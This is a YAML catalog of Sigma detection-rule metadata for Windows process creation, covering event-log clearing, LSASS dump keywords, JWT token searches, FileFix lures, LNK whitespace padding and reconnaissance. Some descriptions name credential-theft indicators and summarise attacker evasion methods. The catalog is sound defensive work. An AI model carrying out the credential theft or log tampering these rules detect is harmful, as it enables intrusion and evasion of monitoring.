  - https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables
  - https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38
  - https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39
  - https://github.com/dotnet/runtime/search?p=1&q=COMPlus_&unscoped_q=COMPlus_
  - https://bunnyinside.com/?term=f71e8cb9c76a
  - http://managed670.rssing.com/chan-5590147/all_p1.html
  - https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code
  - https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: a238b5d0-ce2d-4414-a676-7a531b3d13d6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_etw_trace_evasion.yml
  name: ETW Trace Evasion Activity
  description: 'Detects command line activity that tries to clear or disable any ETW
    trace log which could be a sign of logging evasion.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070
  - T1562.006
  tags:
  - attack.defense-evasion
  - attack.t1070
  - attack.t1562.006
  - car.2016-04-002
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil
  - https://abuse.io/lockergoga.txt
  - https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63
  false_positives:
  - Unknown
  notes: ''
- detection_id: cc36992a-4671-4f21-a91d-6c2b72a2edf5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_eventlog_clear.yml
  name: Suspicious Eventlog Clearing or Configuration Change Activity
  description: 'Detects the clearing or configuration tampering of EventLog using
    utilities such as "wevtutil", "powershell" and "wmic".

    This technique were seen used by threat actors and ransomware strains in order
    to evade defenses.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070.001
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1070.001
  - attack.t1562.002
  - car.2016-04-002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.001/T1070.001.md
  - https://eqllib.readthedocs.io/en/latest/analytics/5b223758-07d6-4100-9e11-238cfdd0fe97.html
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil
  - https://gist.github.com/fovtran/ac0624983c7722e80a8f5a4babb170ee
  - https://jdhnet.wordpress.com/2017/12/19/changing-the-location-of-the-windows-event-logs/
  - https://www.linkedin.com/posts/huntress-labs_when-a-sketchy-incident-hits-your-network-activity-7304940371078238208-Th_l/?utm_source=share&utm_medium=member_desktop&rcm=ACoAAAJTlRcB28IaUtg03HUU-IdliwzoAL1flGc
  - https://stackoverflow.com/questions/66011412/how-to-clear-a-event-log-in-powershell-7
  - https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.eventing.reader.eventlogsession.clearlog?view=windowsdesktop-9.0&viewFallbackFrom=dotnet-plat-ext-5.0#System_Diagnostics_Eventing_Reader_EventLogSession_ClearLog_System_String_
  - https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.eventlog.clear
  false_positives:
  - Admin activity
  - Scripts and administrative tools used in the monitored environment
  - Maintenance activity
  notes: ''
- detection_id: beaa66d6-aa1b-4e3c-80f5-e0145369bfaf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_eventlog_content_recon.yml
  name: Potentially Suspicious EventLog Recon Activity Using Log Query Utilities
  description: 'Detects execution of different log query utilities and commands to
    search and dump the content of specific event logs or look for specific event
    IDs.

    This technique is used by threat actors in order to extract sensitive information
    from events logs such as usernames, IP addresses, hostnames, etc.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1087
  - T1552
  tags:
  - attack.credential-access
  - attack.discovery
  - attack.t1552
  - attack.t1087
  time_window: ''
  references:
  - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html
  - https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a
  - https://www.group-ib.com/blog/apt41-world-tour-2021/
  - https://labs.withsecure.com/content/dam/labs/docs/f-secureLABS-tlp-white-lazarus-threat-intel-report2.pdf
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1
  - http://www.solomonson.com/posts/2010-07-09-reading-eventviewer-command-line/
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil
  - https://ptsecurity.com/research/pt-esc-threat-intelligence/striking-panda-attacks-apt31-today
  - https://www.cybertriage.com/artifact/terminalservices_remoteconnectionmanager_log/
  - https://ponderthebits.com/2018/02/windows-rdp-related-event-logs-identification-tracking-and-investigation/
  false_positives:
  - Legitimate usage of the utility by administrators to query the event log
  notes: ''
- detection_id: 69bd9b97-2be2-41b6-9816-fb08757a4d1a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_execution_from_public_folder_as_parent.yml
  name: Potentially Suspicious Execution From Parent Process In Public Folder
  description: 'Detects a potentially suspicious execution of a parent process located
    in the "\Users\Public" folder executing a child process containing references
    to shell or scripting binaries and commandlines.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1564
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1564
  - attack.t1059
  time_window: ''
  references:
  - https://redcanary.com/blog/blackbyte-ransomware/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3dfd06d2-eaf4-4532-9555-68aca59f57c4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_execution_path.yml
  name: Process Execution From A Potentially Suspicious Folder
  description: Detects a potentially suspicious execution from an uncommon folder.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - https://github.com/mbevilacqua/appcompatprocessor/blob/6c847937c5a836e2ce2fe2b915f213c345a3c389/AppCompatSearch.txt
  - https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses
  - https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/
  - https://github.com/ThreatHuntingProject/ThreatHunting/blob/cb22598bb70651f88e0285abc8d835757d2cb596/hunts/suspicious_process_creation_via_windows_event_logs.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9637e8a5-7131-4f7f-bdc7-2b05d8670c43
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_file_characteristics.yml
  name: Suspicious File Characteristics Due to Missing Fields
  description: Detects Executables in the Downloads folder without FileVersion,Description,Product,Company
    likely created with py2exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.006
  tags:
  - attack.execution
  - attack.t1059.006
  time_window: ''
  references:
  - https://securelist.com/muddywater/88059/
  - https://www.virustotal.com/#/file/276a765a10f98cda1a38d3a31e7483585ca3722ecad19d784441293acf1b7beb/detection
  false_positives:
  - Unknown
  notes: ''
- detection_id: b5b29e4e-31fa-4fdf-b058-296e7a1aa0c2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_filefix_execution_pattern.yml
  name: Suspicious FileFix Execution Pattern
  description: 'Detects suspicious FileFix execution patterns where users are tricked
    into running malicious commands through browser file upload dialog manipulation.

    This attack typically begins when users visit malicious websites impersonating
    legitimate services or news platforms,

    which may display fake CAPTCHA challenges or direct instructions to open file
    explorer and paste clipboard content.

    The clipboard content usually contains commands that download and execute malware,
    such as information stealing tools.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.004
  tags:
  - attack.execution
  - attack.t1204.004
  time_window: ''
  references:
  - https://mrd0x.com/filefix-clickfix-alternative/
  - https://expel.com/blog/cache-smuggling-when-a-picture-isnt-a-thousand-words/
  - https://blog.checkpoint.com/research/filefix-the-new-social-engineering-attack-building-on-clickfix-tested-in-the-wild/
  false_positives:
  - Legitimate use of PowerShell or other utilities launched from browser extensions
    or automation tools
  notes: ''
- detection_id: 07aa184a-870d-413d-893a-157f317f6f58
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_gather_network_info_execution.yml
  name: Suspicious Reconnaissance Activity Via GatherNetworkInfo.VBS
  description: Detects execution of the built-in script located in "C:\Windows\System32\gatherNetworkInfo.vbs".
    Which can be used to gather information about the target machine
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1059.005
  - T1615
  tags:
  - attack.discovery
  - attack.execution
  - attack.t1615
  - attack.t1059.005
  time_window: ''
  references:
  - https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs
  - https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0900463c-b33b-49a8-be1d-552a3b553dae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_hidden_dir_index_allocation.yml
  name: Potential Hidden Directory Creation Via NTFS INDEX_ALLOCATION Stream - CLI
  description: 'Detects command line containing reference to the "::$index_allocation"
    stream, which can be used as a technique to prevent access to folders or files
    from tooling such as "explorer.exe" or "powershell.exe"

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.t1564.004
  time_window: ''
  references:
  - https://twitter.com/pfiatde/status/1681977680688738305
  - https://soroush.me/blog/2010/12/a-dotty-salty-directory-a-secret-place-in-ntfs-for-secret-files/
  - https://sec-consult.com/blog/detail/pentesters-windows-ntfs-tricks-collection/
  - https://github.com/redcanaryco/atomic-red-team/blob/5c3b23002d2bbede3c07e7307165fc2a235a427d/atomics/T1564.004/T1564.004.md#atomic-test-5---create-hidden-directory-via-index_allocation
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/c54dec26-1551-4d3a-a0ea-4fa40f848eb3
  false_positives:
  - Unlikely
  notes: ''
- detection_id: ae9b0bd7-8888-4606-b444-0ed7410cb728
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_hiding_malware_in_fonts_folder.yml
  name: Writing Of Malicious Files To The Fonts Folder
  description: Monitors for the hiding possible malicious files in the C:\Windows\Fonts\
    location. This folder doesn't require admin privillege to be written and executed
    from.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059
  - T1211
  tags:
  - attack.t1211
  - attack.t1059
  - attack.defense-evasion
  - attack.persistence
  - attack.execution
  time_window: ''
  references:
  - https://thedfirreport.com/2020/04/20/sqlserver-or-the-miner-in-the-basement/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 32e280f1-8ad4-46ef-9e80-910657611fbc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_homoglyph_cyrillic_lookalikes.yml
  name: Potential Homoglyph Attack Using Lookalike Characters
  description: 'Detects the presence of unicode characters which are homoglyphs, or
    identical in appearance, to ASCII letter characters.

    This is used as an obfuscation and masquerading techniques. Only "perfect" homoglyphs
    are included; these are characters that

    are indistinguishable from ASCII characters and thus may make excellent candidates
    for homoglyph attack characters.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  - T1036.003
  tags:
  - attack.defense-evasion
  - attack.t1036
  - attack.t1036.003
  time_window: ''
  references:
  - https://redcanary.com/threat-detection-report/threats/socgholish/#threat-socgholish
  - http://www.irongeek.com/homoglyph-attack-generator.php
  false_positives:
  - Commandlines with legitimate Cyrillic text; will likely require tuning (or not
    be usable) in countries where these alphabets are in use.
  notes: ''
- detection_id: 71158e3f-df67-472b-930e-7d287acaa3e1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_image_missing.yml
  name: Execution Of Non-Existing File
  description: Checks whether the image specified in a process creation event is not
    a full, absolute path (caused by process ghosting or other unorthodox methods
    to start a process)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://pentestlaboratories.com/2021/12/08/process-ghosting/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 22e58743-4ac8-4a9f-bf19-00a0428d8c5f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_inline_base64_mz_header.yml
  name: Base64 MZ Header In CommandLine
  description: Detects encoded base64 MZ header in the commandline
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 8537c866-072e-460d-bfff-aaf39cbd73d3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_inline_node_js_execution.yml
  name: Potentially Suspicious Inline JavaScript Execution via NodeJS Binary
  description: Detects potentially suspicious inline JavaScript execution using Node.js
    with specific keywords in the command line.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.007
  tags:
  - attack.execution
  - attack.t1059.007
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2025/04/15/threat-actors-misuse-node-js-to-deliver-malware-and-other-malicious-payloads/
  false_positives:
  - Legitimate scripts using Node.js with these modules
  notes: ''
- detection_id: ba3f5c1b-6272-4119-9dbd-0bc8d21c2702
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_inline_win_api_access.yml
  name: Potential WinAPI Calls Via CommandLine
  description: Detects the use of WinAPI Functions via the commandline. As seen used
    by threat actors via the tool winapiexec
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1106
  tags:
  - attack.execution
  - attack.t1106
  time_window: ''
  references:
  - https://twitter.com/m417z/status/1566674631788007425
  false_positives:
  - Some legitimate action or applications may use these functions. Investigate further
    to determine the legitimacy of the activity.
  notes: ''
- detection_id: 6d3a3952-6530-44a3-8554-cf17c116c615
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_jwt_token_search.yml
  name: Potentially Suspicious JWT Token Search Via CLI
  description: 'Detects potentially suspicious search for JWT tokens via CLI by looking
    for the string "eyJ0eX" or "eyJhbG".

    JWT tokens are often used for access-tokens across various applications and services
    like Microsoft 365, Azure, AWS, Google Cloud, and others.

    Threat actors may search for these tokens to steal them for lateral movement or
    privilege escalation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1528
  - T1552.001
  tags:
  - attack.credential-access
  - attack.t1528
  - attack.t1552.001
  time_window: ''
  references:
  - https://mrd0x.com/stealing-tokens-from-office-applications/
  - https://www.scip.ch/en/?labs.20240523
  false_positives:
  - Unknown
  notes: ''
- detection_id: dd8756e7-a3a0-4768-b47e-8f545d1a751c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_lnk_exec_hidden_cmd.yml
  name: Suspicious LNK Command-Line Padding with Whitespace Characters
  description: 'Detects exploitation of LNK file command-line length discrepancy,
    where attackers hide malicious commands beyond the 260-character UI limit while
    the actual command-line argument field supports 4096 characters using whitespace
    padding (e.g., 0x20, 0x09-0x0D).

    Adversaries insert non-printable whitespace characters (e.g., Line Feed \x0A,
    Carriage Return \x0D) to pad the visible section of the LNK file, pushing malicious
    commands past the UI-visible boundary.

    The hidden payload, executed at runtime but invisible in Windows Explorer properties,
    enables stealthy execution and evasioncommonly used for social engineering attacks.

    This rule flags suspicious use of such padding observed in real-world attacks.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  tags:
  - attack.initial-access
  - attack.execution
  - attack.t1204.002
  time_window: ''
  references:
  - https://syedhasan010.medium.com/forensics-analysis-of-an-lnk-file-da68a98b8415
  - https://thehackernews.com/2025/03/unpatched-windows-zero-day-flaw.html
  - https://www.trendmicro.com/en_us/research/25/c/windows-shortcut-zero-day-exploit.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 502b42de-4306-40b4-9596-6f590c81f073
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_local_system_owner_account_discovery.yml
  name: Local Accounts Discovery
  description: Local accounts, System Owner/User discovery using operating systems
    utilities
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  - T1087.001
  tags:
  - attack.discovery
  - attack.t1033
  - attack.t1087.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1033/T1033.md
  false_positives:
  - Legitimate administrator or user enumerates local users for legitimate reason
  notes: ''
- detection_id: d4ca7c59-e9e4-42d8-bf57-91a776efcb87
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_lolbin_exec_from_non_c_drive.yml
  name: LOLBIN Execution From Abnormal Drive
  description: Detects LOLBINs executing from an abnormal or uncommon drive such as
    a mounted ISO.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://thedfirreport.com/2021/12/13/diavol-ransomware/
  - https://www.scythe.io/library/threat-emulation-qakbot
  - https://sec-consult.com/blog/detail/bumblebee-hunting-with-a-velociraptor/
  false_positives:
  - Rare false positives could occur on servers with multiple drives.
  notes: ''
- detection_id: ffa6861c-4461-4f59-8a41-578c39f3f23e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_lsass_dmp_cli_keywords.yml
  name: LSASS Dump Keyword In CommandLine
  description: 'Detects the presence of the keywords "lsass" and ".dmp" in the commandline,
    which could indicate a potential attempt to dump or create a dump of the lsass
    process.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://github.com/Hackndo/lsassy
  - https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf
  - https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/credential_access_lsass_memdump_file_created.toml
  - https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/
  - https://github.com/helpsystems/nanodump
  - https://github.com/CCob/MirrorDump
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 180c7c5c-d64b-4a63-86e9-68910451bc8b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_ms_appinstaller_download.yml
  name: Potential File Download Via MS-AppInstaller Protocol Handler
  description: 'Detects usage of the "ms-appinstaller" protocol handler via command
    line to potentially download arbitrary files via AppInstaller.EXE

    The downloaded files are temporarly stored in ":\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache\<RANDOM-8-CHAR-DIRECTORY>"

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/
  false_positives:
  - Unknown
  notes: ''
- detection_id: a29c1813-ab1f-4dde-b489-330b952e91ae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_network_command.yml
  name: Suspicious Network Command
  description: Adversaries may look for details about the network configuration and
    settings of systems they access or through information discovery of remote systems
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1016
  tags:
  - attack.discovery
  - attack.t1016
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1016/T1016.md#atomic-test-1---system-network-configuration-discovery-on-windows
  false_positives:
  - Administrator, hotline ask to user
  notes: ''
- detection_id: f8ad2e2c-40b6-4117-84d7-20b89896ab23
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_network_scan_loop.yml
  name: Suspicious Scan Loop Network
  description: Adversaries may attempt to get a listing of other systems by IP address,
    hostname, or other logical identifier on a network that may be used for Lateral
    Movement from the current system
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1018
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  - attack.discovery
  - attack.t1018
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md
  - https://ss64.com/nt/for.html
  - https://ss64.com/ps/foreach-object.html
  false_positives:
  - Legitimate script
  notes: ''
- detection_id: ba1f7802-adc7-48b4-9ecb-81e227fddfd5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_network_sniffing.yml
  name: Potential Network Sniffing Activity Using Network Tools
  description: 'Detects potential network sniffing via use of network tools such as
    "tshark", "windump".

    Network sniffing refers to using the network interface on a system to monitor
    or capture information sent over a wired or wireless connection.

    An adversary may place a network interface into promiscuous mode to passively
    access data in transit over the network, or use span ports to capture a larger
    amount of data.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1040
  tags:
  - attack.credential-access
  - attack.discovery
  - attack.t1040
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1040/T1040.md
  false_positives:
  - Legitimate administration activity to troubleshoot network issues
  notes: ''
- detection_id: f208d6d8-d83a-4c2c-960d-877c37da84e5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_no_image_name.yml
  name: Process Launched Without Image Name
  description: Detect the use of processes with no name (".exe"), which can be used
    to evade Image-based detections.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software
  false_positives:
  - Rare legitimate software.
  notes: ''
- detection_id: c09dad97-1c78-4f71-b127-7edb2b8e491a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_non_exe_image.yml
  name: Execution of Suspicious File Type Extension
  description: 'Detects whether the image specified in a process creation event doesn''t
    refer to an ".exe" (or other known executable extension) file. This can be caused
    by process ghosting or other unorthodox methods to start a process.

    This rule might require some initial baselining to align with some third party
    tooling in the user environment.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://pentestlaboratories.com/2021/12/08/process-ghosting/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8f02c935-effe-45b3-8fc9-ef8696a9e41d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_non_priv_reg_or_ps.yml
  name: Non-privileged Usage of Reg or Powershell
  description: Search for usage of reg or Powershell by non-privileged users to modify
    service configuration in registry
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-20-638.jpg
  false_positives:
  - Unknown
  notes: ''
